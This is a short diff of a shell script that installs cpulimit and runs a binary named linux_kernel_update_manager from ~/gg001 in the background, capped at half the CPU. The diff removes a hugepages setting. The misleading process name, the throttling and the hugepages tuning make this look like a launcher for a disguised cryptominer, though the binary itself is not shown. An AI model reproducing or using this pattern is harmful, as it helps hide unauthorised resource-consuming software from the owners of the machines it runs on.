@@ -2,7 +2,6 @@
 sudo apt-get update &
 sleep 10
 sudo apt install -y cpulimit &&
-sudo sysctl -w vm.nr_hugepages=128 &&
 chmod +x ~/gg001/linux_kernel_update_manager &&
 cpulimit -e linux_kernel_update_manager -l 50 -b &
 sleep 5
